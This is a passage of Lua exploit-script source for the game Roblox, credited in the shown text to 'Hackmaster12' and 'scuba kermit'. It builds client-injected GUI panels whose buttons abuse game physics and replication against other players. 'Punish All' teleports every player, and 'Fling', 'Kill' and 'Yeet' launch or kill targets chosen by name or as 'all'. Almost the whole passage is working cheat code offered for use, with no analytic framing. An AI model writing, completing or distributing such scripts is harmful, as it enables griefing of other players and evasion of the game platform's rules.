			LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
			local currentamount = #LocalPlayer.Backpack:GetChildren()
			LocalPlayer.Character.Archivable = true
			local tempchar = LocalPlayer.Character:Clone()
			tempchar.Parent = workspace
			local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
			local renderstepped = runservice.RenderStepped:Connect(function()
				workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
				for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
					if tool:IsA("Tool") then
						tool.Parent = LocalPlayer
					end
				end
				LocalPlayer.Character:ClearAllChildren()
				local char = Instance.new("Model", workspace)
				table.insert(characters, char)
				Instance.new("Humanoid", char)
				LocalPlayer.Character = char
				repeat
					runservice.RenderStepped:Wait()
				until LocalPlayer.Character ~= nil
			end)
			repeat
				runservice.RenderStepped:Wait()
			until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount + 1
			renderstepped:Disconnect()
			repeat
				runservice.RenderStepped:Wait()
			until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
			for _, char in pairs(characters) do
				char:Destroy()
			end
			for _, tool in pairs(LocalPlayer:GetChildren()) do
				if tool:IsA("Tool") then
					tool.Parent = LocalPlayer.Backpack
				end
			end
			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
			tempchar:Destroy()
			wait()
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(-1 * Spread_Amount - math.random(1, 6), -1 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -4 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -2.5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), 3 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), -1 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1.5 * Spread_Amount - math.random(1, 6), .2 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2.5 * Spread_Amount - math.random(1, 6), .6 * Spread_Amount, -4 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(3 * Spread_Amount - math.random(1, 6), 0 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), .2 * Spread_Amount, -6 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(3 * Spread_Amount - math.random(1, 6), -.2 * Spread_Amount, -5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 3 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 2 * Spread_Amount, -5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(4 * Spread_Amount - math.random(1, 6), 1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), 0.3 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			wait()
			LocalPlayer.Character.Animate.Disabled = true
			wait()
			for i = 1, toolamount do
				LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = workspace.Terrain
			end
			wait()
			for v, i in pairs(game:GetService("Players"):GetChildren()) do
				i.Character.HumanoidRootPart.CFrame = LocalPlayer.Character["Right Arm"].CFrame
			end
			wait()
			LocalPlayer.Character.Animate.Disabled = false
		end)
		PunishAll.Name = "PunishAll"
		PunishAll.Parent = main
		PunishAll.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		PunishAll.Position = UDim2.new(0.646532476, 0, 0.316009164, 0)
		PunishAll.Size = UDim2.new(0, 124, 0, 44)
		PunishAll.Font = Enum.Font.SourceSansBold
		PunishAll.FontSize = Enum.FontSize.Size24
		PunishAll.Text = "Punish All"
		PunishAll.TextColor3 = Color3.new(1, 1, 1)
		PunishAll.TextSize = 20
		PunishAll.TextStrokeTransparency = 0
		PunishAll.MouseButton1Down:connect(function()
			local SpreadAmount = 1
			local Spread_Amount = SpreadAmount - math.random(.0625, .1875)
			local toolamount = -8 * -8 / 4 + math.random(-1, 0)
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local runservice = game:GetService("RunService")
			local characters = {}
			LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
			local currentamount = #LocalPlayer.Backpack:GetChildren()
			LocalPlayer.Character.Archivable = true
			local tempchar = LocalPlayer.Character:Clone()
			tempchar.Parent = workspace
			local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
			local renderstepped = runservice.RenderStepped:Connect(function()
				workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
				for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
					if tool:IsA("Tool") then
						tool.Parent = LocalPlayer
					end
				end
				LocalPlayer.Character:ClearAllChildren()
				local char = Instance.new("Model", workspace)
				table.insert(characters, char)
				Instance.new("Humanoid", char)
				LocalPlayer.Character = char
				repeat
					runservice.RenderStepped:Wait()
				until LocalPlayer.Character ~= nil
			end)
			repeat
				runservice.RenderStepped:Wait()
			until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount + 1
			renderstepped:Disconnect()
			repeat
				runservice.RenderStepped:Wait()
			until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
			for _, char in pairs(characters) do
				char:Destroy()
			end
			for _, tool in pairs(LocalPlayer:GetChildren()) do
				if tool:IsA("Tool") then
					tool.Parent = LocalPlayer.Backpack
				end
			end
			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
			tempchar:Destroy()
			wait()
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(-1 * Spread_Amount - math.random(1, 6), -1 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -4 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -2.5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), 3 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), -1 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1.5 * Spread_Amount - math.random(1, 6), .2 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2.5 * Spread_Amount - math.random(1, 6), .6 * Spread_Amount, -4 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 0.1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(3 * Spread_Amount - math.random(1, 6), 0 * Spread_Amount, -2 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), .2 * Spread_Amount, -6 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(3 * Spread_Amount - math.random(1, 6), -.2 * Spread_Amount, -5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(1 * Spread_Amount - math.random(1, 6), 3 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(2 * Spread_Amount - math.random(1, 6), 2 * Spread_Amount, -5 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(4 * Spread_Amount - math.random(1, 6), 1 * Spread_Amount, -1 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").GripPos = Vector3.new(5 * Spread_Amount - math.random(1, 6), 0.3 * Spread_Amount, -3 * Spread_Amount)
			LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game:GetService("Players").LocalPlayer.Character
			wait()
			LocalPlayer.Character.Animate.Disabled = true
			wait()
			for i = 1, toolamount do
				LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = workspace.Terrain
			end
			wait()
			for v, i in pairs(game:GetService("Players"):GetChildren()) do
				i.Character.HumanoidRootPart.CFrame = LocalPlayer.Character["Right Arm"].CFrame
			end
			wait(math.random(0, .00375))
			for i = 1, math.random(2, 8) do
				wait(math.random(0, .0625))
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1000000000, 0)
			end
		end)
		Page2Button.Name = "Page2Button"
		Page2Button.Parent = main
		Page2Button.BackgroundColor3 = Color3.new(0.505882, 0.505882, 0.505882)
		Page2Button.Position = UDim2.new(0.794183373, 0, 0.874492049, 0)
		Page2Button.Size = UDim2.new(0, 42, 0, 23)
		Page2Button.Font = Enum.Font.GothamBlack
		Page2Button.FontSize = Enum.FontSize.Size14
		Page2Button.Text = ">"
		Page2Button.TextColor3 = Color3.new(0, 0, 0)
		Page2Button.TextSize = 14
		Page2Button.MouseButton1Down:connect(function()
			main.Visible = false
			Page2.Visible = true
		end)
		Page2.Name = "Page2"
		Page2.Parent = MainGui
		Page2.BackgroundColor3 = Color3.new(0.580392, 0.580392, 0.580392)
		Page2.BorderSizePixel = 0
		Page2.Position = UDim2.new(0, 0, 0.283932239, 0)
		Page2.Size = UDim2.new(0, 446, 0, 238)
		Page2.Visible = false
		Goto.Name = "Goto"
		Goto.Parent = Page2
		Goto.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Goto.Position = UDim2.new(0.0358042195, 0, 0.0740150958, 0)
		Goto.Size = UDim2.new(0, 124, 0, 44)
		Goto.Font = Enum.Font.SourceSansBold
		Goto.FontSize = Enum.FontSize.Size24
		Goto.Text = "Goto"
		Goto.TextColor3 = Color3.new(1, 1, 1)
		Goto.TextSize = 20
		Goto.TextStrokeTransparency = 0
		Goto.MouseButton1Down:connect(function()
			local noob = unpack(GetPlayer(Player.Text)).Character
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = noob.HumanoidRootPart.CFrame
		end)
		View.Name = "View"
		View.Parent = Page2
		View.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		View.Position = UDim2.new(0.346766174, 0, 0.0740150958, 0)
		View.Size = UDim2.new(0, 124, 0, 44)
		View.Font = Enum.Font.SourceSansBold
		View.FontSize = Enum.FontSize.Size24
		View.Text = "View"
		View.TextColor3 = Color3.new(1, 1, 1)
		View.TextSize = 20
		View.TextStrokeTransparency = 0
		View.MouseButton1Down:connect(function()
			for i, v in pairs(GetPlayer(Player.Text)) do
				if game:GetService("Players")[v.Name].Character.Humanoid then
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
				else
					game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
				end
			end
		end)
		Noview.Name = "Noview"
		Noview.Parent = Page2
		Noview.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Noview.Position = UDim2.new(0.644305348, 0, 0.0740150958, 0)
		Noview.Size = UDim2.new(0, 124, 0, 44)
		Noview.Font = Enum.Font.SourceSansBold
		Noview.FontSize = Enum.FontSize.Size24
		Noview.Text = "Unview"
		Noview.TextColor3 = Color3.new(1, 1, 1)
		Noview.TextSize = 20
		Noview.TextStrokeTransparency = 0
		Noview.TextWrapped = true
		Noview.MouseButton1Down:connect(function()
			if lplayer.Character.Humanoid then
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
			else
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
			end
		end)
		Fling.Name = "Fling"
		Fling.Parent = Page2
		Fling.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Fling.Position = UDim2.new(0.038031321, 0, 0.316009164, 0)
		Fling.Size = UDim2.new(0, 124, 0, 44)
		Fling.Font = Enum.Font.SourceSansBold
		Fling.FontSize = Enum.FontSize.Size24
		Fling.Text = "Fling"
		Fling.TextColor3 = Color3.new(1, 1, 1)
		Fling.TextSize = 20
		Fling.TextStrokeTransparency = 0
		Fling.MouseButton1Down:connect(function()
			local target = unpack(GetPlayer(Player.Text)).Character
			game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = true
			killing = true
			local coin = Instance.new('BodyThrust', game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart)
			coin.Force = Vector3.new(9999, 9999, 9999)
			coin.Name = "killforce"
			repeat
				game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;
				coin.Location = target.Head.Position
				game["Run Service"].Heartbeat:wait()
			until not target.Head or killing == false
		end)
		nofling.Name = "nofling"
		nofling.Parent = Page2
		nofling.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		nofling.Position = UDim2.new(0.348993301, 0, 0.316009164, 0)
		nofling.Size = UDim2.new(0, 124, 0, 44)
		nofling.Font = Enum.Font.SourceSansBold
		nofling.FontSize = Enum.FontSize.Size24
		nofling.Text = "Stop Flinging "
		nofling.TextColor3 = Color3.new(1, 1, 1)
		nofling.TextSize = 20
		nofling.TextStrokeTransparency = 0
		nofling.MouseButton1Down:connect(function()
			ypcall(function()
				game:GetService'Players'.LocalPlayer.Character.HumanoidRootPart.yeetforce:Destroy()
				game:GetService'Players'.LocalPlayer.Character.Humanoid.PlatformStand = false
			end)
			killing = false
		end)
		Kill.Name = "Kill"
		Kill.Parent = Page2
		Kill.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Kill.Position = UDim2.new(0.646532476, 0, 0.316009164, 0)
		Kill.Size = UDim2.new(0, 124, 0, 44)
		Kill.Font = Enum.Font.SourceSansBold
		Kill.FontSize = Enum.FontSize.Size24
		Kill.Text = "Kill"
		Kill.TextColor3 = Color3.new(1, 1, 1)
		Kill.TextSize = 20
		Kill.TextStrokeTransparency = 0
		Kill.MouseButton1Down:connect(function()
			for i, v in pairs(GetPlayer(Player.Text)) do
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local target = game:GetService("Players")[v.Name]
				local torsoname = "Torso"
				if LocalPlayer.Character:FindFirstChild("Humanoid").RigType == Enum.HumanoidRigType.R15 then
					torsoname = "UpperTorso"
				end
				if target.Character ~= nil then
					local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
					LocalPlayer.Character:FindFirstChild(torsoname).Anchored = true
					local tool = Instance.new("Tool", LocalPlayer.Backpack)
					local hat = LocalPlayer.Character:FindFirstChildOfClass("Accessory")
					local hathandle = hat.Handle
					hathandle.Parent = tool
					hathandle.Massless = true
					tool.GripPos = Vector3.new(0, 9e99, 0)
					tool.Parent = LocalPlayer.Character
					repeat
						wait()
					until LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= nil
					tool.Grip = CFrame.new(Vector3.new(0, 0, 0))
					LocalPlayer.Character:FindFirstChild(torsoname).Anchored = false
					repeat
						LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = target.Character:FindFirstChild("HumanoidRootPart").CFrame
						wait()
					until target.Character == nil or target.Character:FindFirstChild("Humanoid").Health <= 0 or LocalPlayer.Character == nil or LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0 or (target.Character:FindFirstChild("HumanoidRootPart").Velocity.magnitude - target.Character:FindFirstChild("Humanoid").WalkSpeed) > (target.Character:FindFirstChild("Humanoid").WalkSpeed + 20)
					LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
					hathandle.Parent = hat
					hathandle.Massless = false
					tool:Destroy()
					LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
				end
			end
		end)
		Page3Button.Name = "Page3Button"
		Page3Button.Parent = Page2
		Page3Button.BackgroundColor3 = Color3.new(0.505882, 0.505882, 0.505882)
		Page3Button.Position = UDim2.new(0.794183373, 0, 0.874492049, 0)
		Page3Button.Size = UDim2.new(0, 42, 0, 23)
		Page3Button.Font = Enum.Font.GothamBlack
		Page3Button.FontSize = Enum.FontSize.Size14
		Page3Button.Text = ">"
		Page3Button.TextColor3 = Color3.new(0, 0, 0)
		Page3Button.TextSize = 14
		Page3Button.MouseButton1Down:connect(function()
			Page2.Visible = false
			main.Visible = false
			Page3.Visible = true
		end)
		BackToPage1.Name = "BackToPage1"
		BackToPage1.Parent = Page2
		BackToPage1.BackgroundColor3 = Color3.new(0.505882, 0.505882, 0.505882)
		BackToPage1.Position = UDim2.new(0.126021922, 0, 0.874492049, 0)
		BackToPage1.Size = UDim2.new(0, 42, 0, 23)
		BackToPage1.Font = Enum.Font.GothamBlack
		BackToPage1.FontSize = Enum.FontSize.Size14
		BackToPage1.Text = "<"
		BackToPage1.TextColor3 = Color3.new(0, 0, 0)
		BackToPage1.TextSize = 14
		BackToPage1.MouseButton1Down:connect(function()
			Page2.Visible = false
			main.Visible = true
			Page3.Visible = false
		end)
		Player.Name = "Player"
		Player.Parent = Page2
		Player.BackgroundColor3 = Color3.new(0.54902, 0.54902, 0.54902)
		Player.Position = UDim2.new(0.260089695, 0, 0.613445401, 0)
		Player.Size = UDim2.new(0, 200, 0, 50)
		Player.Font = Enum.Font.SourceSansBold
		Player.FontSize = Enum.FontSize.Size24
		Player.Text = "Username"
		Player.TextColor3 = Color3.new(0, 0, 0)
		Player.TextSize = 20
		Player.TextWrapped = true
		Page3.Name = "Page3"
		Page3.Parent = MainGui
		Page3.BackgroundColor3 = Color3.new(0.580392, 0.580392, 0.580392)
		Page3.BorderSizePixel = 0
		Page3.Position = UDim2.new(0, 0, 0.283932239, 0)
		Page3.Size = UDim2.new(0, 446, 0, 238)
		Page3.Visible = false
		BackToPage2.Name = "BackToPage2"
		BackToPage2.Parent = Page3
		BackToPage2.BackgroundColor3 = Color3.new(0.505882, 0.505882, 0.505882)
		BackToPage2.Position = UDim2.new(0.126021922, 0, 0.874492049, 0)
		BackToPage2.Size = UDim2.new(0, 42, 0, 23)
		BackToPage2.Font = Enum.Font.GothamBlack
		BackToPage2.FontSize = Enum.FontSize.Size14
		BackToPage2.Text = "<"
		BackToPage2.TextColor3 = Color3.new(0, 0, 0)
		BackToPage2.TextSize = 14
		BackToPage2.MouseButton1Down:connect(function()
			Page2.Visible = true
			main.Visible = false
			Page3.Visible = false
		end)
		TextLabel_3.Parent = Page3
		TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel_3.BackgroundTransparency = 1
		TextLabel_3.BorderSizePixel = 0
		TextLabel_3.Size = UDim2.new(0, 446, 0, 195)
		TextLabel_3.Font = Enum.Font.SourceSansSemibold
		TextLabel_3.FontSize = Enum.FontSize.Size48
		TextLabel_3.Text = "Made By Hackmaster12"
		TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
		TextLabel_3.TextSize = 40
	end
})
GUIS:AddButton({
	Title = "Yeet V3 FE GUI",
	Description = "Flings Players",
	Callback = function()
		local lplayer = game:GetService('Players').LocalPlayer
		local yeeting = false
		function GetPlayer(String)
			local Found = {}
			local strl = String:lower()
			if strl == "all" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(Found, v)
				end
			elseif strl == "others" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= lplayer.Name then
						table.insert(Found, v)
					end
				end
			elseif strl == "me" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name == lplayer.Name then
						table.insert(Found, v)
					end
				end
			else
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(Found, v)
					end
				end
			end
			return Found
		end
		function ahh(thing)
			local asd = {
				'yeet',
				'gui',
				'yeet gui'
			}
			local f = string.upper(asd[math.random(1, #asd)])
			return f
		end
		local XD = Instance.new("ScreenGui")
		local BeGONE = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		local TextLabel_2 = Instance.new("TextLabel")
		local AA = Instance.new("TextBox")
		local yets = Instance.new("TextButton")
		local stopyets = Instance.new("TextButton")
		local ultrayets = Instance.new("TextButton")
		local ImageLabel = Instance.new("ImageLabel")
		local TextLabel_3 = Instance.new("TextLabel")
		XD.Name = "XD"
		XD.Parent = game:GetService('CoreGui')
		BeGONE.Name = "BeGONE"
		BeGONE.Parent = XD
		BeGONE.Active = true
		BeGONE.Draggable = true
		BeGONE.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
		BeGONE.BorderSizePixel = 0
		BeGONE.Position = UDim2.new(-0.0207920745, 111, 0.722570539, -1)
		BeGONE.Size = UDim2.new(0, 389, 0, 129)
		TextLabel.Parent = BeGONE
		TextLabel.BackgroundColor3 = Color3.new(1, 0.419608, 0.129412)
		TextLabel.BorderSizePixel = 0
		TextLabel.Size = UDim2.new(0, 389, 0, 22)
		TextLabel.Font = Enum.Font.Cartoon
		TextLabel.Text = "fe yeet gui v3 (yes v3 xd) by scuba kermit"
		TextLabel.TextColor3 = Color3.new(0, 0, 0)
		TextLabel.TextSize = 16
		TextLabel.TextWrapped = true
		TextLabel_2.Parent = BeGONE
		TextLabel_2.BackgroundColor3 = Color3.new(0.831373, 0.509804, 0.054902)
		TextLabel_2.BorderSizePixel = 0
		TextLabel_2.Position = UDim2.new(0, 0, 0.169230849, 0)
		TextLabel_2.Size = UDim2.new(0, 389, 0, 9)
		TextLabel_2.Font = Enum.Font.SourceSans
		TextLabel_2.Text = ""
		TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
		TextLabel_2.TextSize = 14
		AA.Name = "AA"
		AA.Parent = BeGONE
		AA.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		AA.BorderSizePixel = 0
		AA.Position = UDim2.new(0.20364143, 0, 0.299216866, 0)
		AA.Size = UDim2.new(0, 229, 0, 35)
		AA.Font = Enum.Font.SourceSans
		AA.PlaceholderColor3 = Color3.new(0.831373, 0.831373, 0.831373)
		AA.PlaceholderText = "Player you wanna yeet (can be shortened)"
		AA.Text = ""
		AA.TextColor3 = Color3.new(1, 1, 1)
		AA.TextSize = 14
		AA.TextWrapped = true
		yets.Name = "yets"
		yets.Parent = BeGONE
		yets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		yets.BorderSizePixel = 0
		yets.Position = UDim2.new(0.0364736132, 0, 0.646153867, 0)
		yets.Size = UDim2.new(0, 94, 0, 28)
		yets.Font = Enum.Font.SourceSans
		yets.Text = "Y E E T"
		yets.TextColor3 = Color3.new(1, 1, 1)
		yets.TextSize = 14
		yets.TextWrapped = true
		stopyets.Name = "stopyets"
		stopyets.Parent = BeGONE
		stopyets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		stopyets.BorderSizePixel = 0
		stopyets.Position = UDim2.new(0.722082794, 0, 0.646153867, 0)
		stopyets.Size = UDim2.new(0, 94, 0, 28)
		stopyets.Font = Enum.Font.SourceSans
		stopyets.Text = "Stop Y E E T ing"
		stopyets.TextColor3 = Color3.new(1, 1, 1)
		stopyets.TextSize = 14
		stopyets.TextWrapped = true
		ultrayets.Name = "ultrayets"
		ultrayets.Parent = BeGONE
		ultrayets.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		ultrayets.BorderSizePixel = 0
		ultrayets.Position = UDim2.new(0.298684418, 0, 0.646154106, 0)
		ultrayets.Size = UDim2.new(0, 156, 0, 28)
		ultrayets.Font = Enum.Font.SourceSans
		ultrayets.Text = "U L T R A Y E E T"
		ultrayets.TextColor3 = Color3.new(1, 1, 1)
		ultrayets.TextSize = 14
		ultrayets.TextWrapped = true
		ImageLabel.Parent = XD
		ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
		ImageLabel.BackgroundTransparency = 1
		ImageLabel.BorderSizePixel = 0
		ImageLabel.Position = UDim2.new(0.9, 0, 0.835423172, 0)
		ImageLabel.Size = UDim2.new(0, 100, 0, 100)
		ImageLabel.Image = "rbxassetid://2152234287"
		TextLabel_3.Parent = ImageLabel
		TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
		TextLabel_3.BackgroundTransparency = 1
		TextLabel_3.BorderSizePixel = 0
		TextLabel_3.Position = UDim2.new(0.110989988, 0, 0.103538811, 0)
		TextLabel_3.Size = UDim2.new(0, 77, 0, 23)
		TextLabel_3.Font = Enum.Font.Arial
		TextLabel_3.Text = "yeet gui"
		TextLabel_3.TextColor3 = Color3.new(0, 0, 0)
